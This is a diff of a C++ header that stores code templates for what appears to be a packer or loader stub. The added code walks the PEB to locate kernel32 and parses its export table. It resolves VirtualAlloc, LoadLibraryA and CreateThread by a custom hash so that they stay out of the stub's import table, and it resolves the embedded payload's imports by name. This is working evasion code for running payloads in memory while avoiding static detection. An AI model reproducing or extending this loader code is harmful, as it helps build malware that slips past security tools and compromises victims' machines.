@@ -2,23 +2,31 @@
 #define STUBSTR_H
 
 std::string DYN_GLOBALS = R"(
-using VirtualAlloc_t = LPVOID (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-using VirtualFree_t = BOOL (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
-using LoadLibraryA_t = HMODULE (WINAPI *)(LPCSTR lpLibFileName);
-using CreateThread_t = HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-using WaitForSingleObject_t = DWORD (WINAPI *)(HANDLE hHandle, DWORD dwMilliseconds);
-using CloseHandle_t = BOOL (WINAPI *)(HANDLE hObject);
+typedef LPVOID (WINAPI* VirtualAlloc_t)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flAllocationType,
+    DWORD flProtect
+);
 
-VirtualAlloc_t VA = NULL;
-VirtualFree_t VF = NULL;
-LoadLibraryA_t LLA = NULL;
-CreateThread_t CT = NULL;
-WaitForSingleObject_t WFO = NULL;
-CloseHandle_t CH = NULL;
+typedef HMODULE (WINAPI* LoadLibraryA_t)(
+    LPCSTR lpLibFileName
+);
 
-FARPROC addr[6];
+typedef HANDLE (WINAPI* CreateThread_t)(
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    SIZE_T dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    DWORD dwCreationFlags,
+    LPDWORD lpThreadId
+);
 
-DWORD getHashFromString(char *string){
+LoadLibraryA_t pLoadLibraryA = nullptr;
+VirtualAlloc_t pVirtualAlloc = nullptr;
+CreateThread_t pCreateThread = nullptr;
+
+DWORD getHashFromString(const char *string){
     size_t strlength = strnlen_s(string, 50);
     DWORD hash = 0x35;
 
@@ -29,59 +37,100 @@ DWORD getHashFromString(char *string){
     return hash;
 }
 
-FARPROC getFunctionAddressByHash(DWORD hash) {
-    HMODULE libraryBase = GetModuleHandleA("kernel32.dll");
-    if (!libraryBase) {
-        cerr << "Failed to get handle to kernel32.dll" << endl;
-        return NULL;
-    }
+typedef struct _LDR_DATA_TABLE_ENTRY_EX {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    void* DllBase;
+    void* EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;
 
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
-    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
-    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+PEB* get_peb() {
+    return (PEB*)__readgsqword(0x60);  
+}
 
-    PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
-    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
-    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
+HMODULE get_dll_base(const wchar_t* name) {
+    PEB* peb = get_peb();
+    LIST_ENTRY* module_list = &peb->Ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* current_entry = module_list->Flink;
 
-    for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++) {
-        DWORD functionNameRVA = addressOfNamesRVA[i];
-        char *functionName = (char *)((DWORD_PTR)libraryBase + functionNameRVA);
-        DWORD functionNameHash = getHashFromString(functionName);
-
-        //cout << "Function Name: " << functionName << ", Hash: " << functionNameHash << endl;
-
-        if (functionNameHash == hash) {
-            DWORD functionAddressRVA = addressOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
-            FARPROC functionAddress = (FARPROC)((DWORD_PTR)libraryBase + functionAddressRVA);
-            return functionAddress;
+    while (current_entry != module_list) {
+        auto entry = CONTAINING_RECORD(current_entry, LDR_DATA_TABLE_ENTRY_EX, InMemoryOrderLinks);
+        
+        wchar_t* module_name = entry->BaseDllName.Buffer;
+        if (_wcsicmp(module_name, name) == 0) {
+            return (HMODULE)entry->DllBase;
         }
+        current_entry = current_entry->Flink;
     }
-
-    return NULL;
+    return nullptr;
 }
 
-void resolveAddress(){
-    const char *lib = "kernel32.dll";
-    /*DWORD_ARRAY_PLACEHOLDER*/
+void* resolveAddr(HMODULE hModule, const char* name, DWORD hash){
+    auto dos_header = (PIMAGE_DOS_HEADER)hModule;
+    auto nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos_header->e_lfanew);
+    auto export_dir_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    auto export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + export_dir_rva);
 
-    for(int i=0;i<6;i++){
-        addr[i] = getFunctionAddressByHash(fun[i]);
+    auto names = (DWORD*)((BYTE*)hModule + export_dir->AddressOfNames);
+    auto functions = (DWORD*)((BYTE*)hModule + export_dir->AddressOfFunctions);
+    auto ordinals = (WORD*)((BYTE*)hModule + export_dir->AddressOfNameOrdinals);
+
+    for(DWORD i  = 0; i < export_dir->NumberOfNames; i++){
+        const char *fn_name = (const char*)hModule + names[i];
+
+        // Resolve by name, for the payloads imports that need to be resolved
+
+        if(name && strcmp(fn_name, name) == 0) {
+            WORD ordinal = ordinals[i];
+            DWORD fn_rva = functions[ordinal];
+            return ((BYTE*)hModule + fn_rva);
+        }
+        // Resolve by hash, for functions that should not be in the stubs IAT
+        if(!name){
+            DWORD fn_hashed = getHashFromString(fn_name);
+            if(fn_hashed == hash){
+                WORD ordinal = ordinals[i];
+                DWORD fn_rva = functions[ordinal];
+                printf("Function: %s (hash: %u) resolved at: %p\n", fn_name, fn_hashed, ((BYTE*)hModule + fn_rva));
+                return ((BYTE*)hModule + fn_rva);
+            }
+        }
+
     }
-
-    // Resolve using hashing method, and compare to the result from resolveAddress()
-    VA = (VirtualAlloc_t)addr[0];
-    VF = (VirtualFree_t)addr[1];
-    LLA = (LoadLibraryA_t)addr[2];
-    CT = (CreateThread_t)addr[3];
-    WFO = (WaitForSingleObject_t)addr[4];
-    CH = (CloseHandle_t)addr[5];
+    cout << "Failed to resolve address for:\nHash:" << hash << "\nname:" << name << endl;
+    return nullptr;
 }
+
+void resolveFuncPointers(DWORD *hashes, HMODULE handle){
+    pVirtualAlloc = (VirtualAlloc_t)(void*)resolveAddr(handle, 0, hashes[0]);
+    pLoadLibraryA = (LoadLibraryA_t)(void*)resolveAddr(handle, 0, hashes[1]);
+    pCreateThread = (CreateThread_t)(void*)resolveAddr(handle, 0, hashes[2]);
+
+    void* realLLA = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    void* realVA = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
+    void* realCT = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
+
+    printf("[+] pLoadLibraryA: %p : %p\n", pLoadLibraryA, realLLA);
+    printf("[+] pVirtualAlloc: %p : %p\n", pVirtualAlloc, realVA);
+    printf("[+] pCreateThread: %p : %p\n", pCreateThread, realCT);
+
+    HMODULE testLib = pLoadLibraryA("kernel32.dll");
+    if(!testLib){
+        cerr << "pLoadLibraryA failed with error " << GetLastError() << endl;
+    }
+}
+
 )";
 
 std::string DYN_CALL = R"(
-    resolveAddress();
+    const wchar_t* name = L"kernel32.dll";
+    HMODULE kernel32 = get_dll_base(name);
+    /*DWORD_ARRAY_PLACEHOLDER*/
+    resolveFuncPointers(hashes, kernel32);
 )";
 
 std::string RAND_DEF = R"(
